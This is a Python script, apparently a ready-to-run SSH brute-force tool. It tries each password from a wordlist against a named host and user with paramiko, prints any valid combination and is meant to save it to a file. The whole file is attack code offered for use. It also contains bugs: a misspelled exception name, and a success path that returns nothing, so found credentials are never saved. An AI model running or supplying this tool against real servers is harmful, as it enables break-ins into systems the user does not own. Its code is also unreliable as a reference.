#!/usr/bin/python3
import paramiko
import socket
import time
from colorama import init, Fore

init()

RESET = Fore.RESET
RED = Fore.RED
BLUE = Fore.BLUE

def is_ssh_open(hostname, username, password):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(hostname=hostname, username=username, password=password, timeout=3)
	except socket.timeout:
		print(f"{RED}[!] Host: {hostname} is unreachable, time out. {RESET}")
		return False
	except paramiko.AuthenticationException:
		print(f"{BLUE}[!] Invalid Credential for {username}:{password}")
		return False
	except paramiko.SSHExeption:
		print(f"{BLUE}[*] Quota exceeded, retrying with delay ..{RESET}")
		time.sleep(60)
		return is_ssh_open(hostname, username, password)
	else:
		print(f"{RED}Found Combo: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")

def main():
	import 	argparse
	parser = argparse.ArgumentParser(description="SSH Bruteforce Python Script.")
	parser.add_argument("host", help="Hostname or IP Address of SSH Server to brute.")
	parser.add_argument("-p", "--wordlist", help="File that contain password list.")
	parser.add_argument("-u", "--user", help="Host username.")

	args = parser.parse_args()
	host = args.host
	wordlist = args.wordlist
	user = args.user
	wordlist = open(wordlist).read().splitlines()

	for password in wordlist:
		if is_ssh_open(host, user, password):
			# if combo is valid, save it to a file
			open(f"credentials.txt", "w").write(f"{user}@{host}:{password}")
			break

main()
